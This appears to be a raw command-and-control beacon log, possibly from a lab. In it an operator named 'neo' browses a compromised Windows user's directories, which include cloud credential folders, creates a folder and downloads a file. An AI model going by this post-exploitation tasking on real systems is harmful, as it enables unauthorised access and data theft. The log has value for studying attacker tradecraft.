12/16 00:25:42 UTC [metadata] 192.168.1.20 <- 192.168.1.20; computer: ACER; user: david; process: mspaint.exe; pid: 4580; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
12/16 00:26:12 UTC [input] <neo> ls
12/16 00:26:12 UTC [task] <> Tasked beacon to list files in .
12/16 00:26:42 UTC [checkin] host called home, sent: 19 bytes
12/16 00:26:42 UTC [output]
C:\Users\david\AppData\Local\Temp\RarSFX9\*
D	0	12/16/2022 07:24:41	.
D	0	12/16/2022 07:26:07	..
F	927232	12/15/2022 20:43:09	a.exe
F	2247	12/15/2022 15:25:31	Google Chrome.lnk


12/16 00:27:08 UTC [input] <neo> cd ../../..
12/16 00:27:08 UTC [task] <> cd ../../..
12/16 00:27:42 UTC [checkin] host called home, sent: 16 bytes
12/16 00:27:47 UTC [input] <neo> pwd
12/16 00:27:47 UTC [task] <> Tasked beacon to print working directory
12/16 00:28:12 UTC [input] <neo> cd ..
12/16 00:28:12 UTC [task] <> cd ..
12/16 00:28:42 UTC [checkin] host called home, sent: 18 bytes
12/16 00:28:42 UTC [output]
Current directory is C:\Users\david\AppData

12/16 00:29:45 UTC [input] <neo> mkdir huy
12/16 00:29:45 UTC [task] <> Tasked beacon to make directory huy
12/16 00:29:55 UTC [input] <neo> dir
12/16 00:29:55 UTC [error] Unknown command: dir
12/16 00:30:42 UTC [checkin] host called home, sent: 11 bytes
12/16 00:30:43 UTC [input] <neo> ls
12/16 00:30:43 UTC [task] <> Tasked beacon to list files in .
12/16 00:31:42 UTC [checkin] host called home, sent: 19 bytes
12/16 00:31:42 UTC [output]
C:\Users\david\*
D	0	12/16/2022 07:30:42	.
D	0	10/15/2022 12:35:02	..
F	5791	11/06/2022 18:38:12	-1.14-windows.xml
D	0	11/25/2022 10:07:08	.aws
D	0	11/25/2022 10:07:08	.azure
D	0	12/03/2022 13:06:40	.conda
F	25	11/25/2022 10:39:53	.condarc
D	0	11/25/2022 10:39:36	.continuum
D	0	11/25/2022 10:07:14	.docker
D	0	12/13/2022 17:46:34	.dotnet
D	0	11/23/2022 13:56:39	.ipython
D	0	12/03/2022 13:05:56	.jupyter
D	0	11/14/2022 19:12:31	.Ld9VirtualBox
D	0	10/29/2022 13:45:04	.m2
D	0	11/23/2022 13:56:36	.matplotlib
D	0	11/03/2022 16:35:37	.nbi
D	0	12/13/2022 17:46:30	.nuget
D	0	12/07/2022 16:09:59	.omnisharp
F	176	12/12/2022 12:41:24	.packettracer
D	0	11/25/2022 11:08:54	.spyder-py3
D	0	12/07/2022 16:09:38	.templateengine
D	0	08/27/2022 00:49:02	.vscode
D	0	09/21/2022 12:27:39	AppData
D	0	09/21/2022 12:06:48	Application Data
D	0	12/05/2022 13:47:33	Cisco Packet Tracer 8.1.1
D	0	09/21/2022 12:29:43	Contacts
D	0	09/21/2022 12:06:48	Cookies
D	0	11/15/2022 16:38:59	Documents
D	0	12/15/2022 22:50:04	Downloads
D	0	09/21/2022 12:29:43	Favorites
D	0	12/08/2022 10:23:41	GNS3
D	0	12/16/2022 07:30:42	huy
F	0	12/16/2022 07:28:44	huy.txt
D	0	12/16/2022 07:15:49	IntelGraphicsProfiles
D	0	11/23/2022 19:25:04	Jedi
D	0	09/21/2022 12:29:43	Links
D	0	09/21/2022 12:06:48	Local Settings
D	0	09/21/2022 12:29:43	Music
D	0	09/21/2022 12:06:48	My Documents
D	0	09/21/2022 12:06:48	NetHood
F	13369344	12/16/2022 07:15:14	NTUSER.DAT
F	3347456	09/21/2022 12:06:48	ntuser.dat.LOG1
F	3343360	09/21/2022 12:06:48	ntuser.dat.LOG2
F	65536	09/21/2022 12:06:48	NTUSER.DAT{a2332f18-cdbf-11ec-8680-002248483d79}.TM.blf
F	524288	09/21/2022 12:06:48	NTUSER.DAT{a2332f18-cdbf-11ec-8680-002248483d79}.TMContainer00000000000000000001.regtrans-ms
F	524288	09/21/2022 12:06:48	NTUSER.DAT{a2332f18-cdbf-11ec-8680-002248483d79}.TMContainer00000000000000000002.regtrans-ms
F	20	09/21/2022 12:29:34	ntuser.ini
D	0	12/07/2022 19:56:57	OneDrive
D	0	09/21/2022 12:06:48	PrintHood
D	0	09/21/2022 12:06:48	Recent
D	0	09/21/2022 12:29:43	Saved Games
D	0	09/21/2022 12:29:43	Searches
D	0	09/21/2022 12:06:48	SendTo
D	0	08/26/2022 07:40:26	source
D	0	09/21/2022 12:06:48	Start Menu
D	0	09/21/2022 12:06:48	Templates
D	0	08/26/2022 07:29:39	Tracing
D	0	12/15/2022 14:19:52	Videos


12/16 00:32:09 UTC [input] <neo> download huy.txt
12/16 00:32:09 UTC [task] <T1005> Tasked beacon to download huy.txt
12/16 00:32:42 UTC [checkin] host called home, sent: 15 bytes
12/16 00:32:42 UTC [error] File 'huy.txt' is either too large (>4GB) or size check failed
12/16 00:33:05 UTC [input] <neo> download huy.txt
12/16 00:33:05 UTC [task] <T1005> Tasked beacon to download huy.txt
12/16 00:33:42 UTC [checkin] host called home, sent: 15 bytes
12/16 00:33:42 UTC [output]
started download of C:\Users\david\huy.txt (5 bytes)

12/16 00:33:42 UTC [output]
download of huy.txt is complete

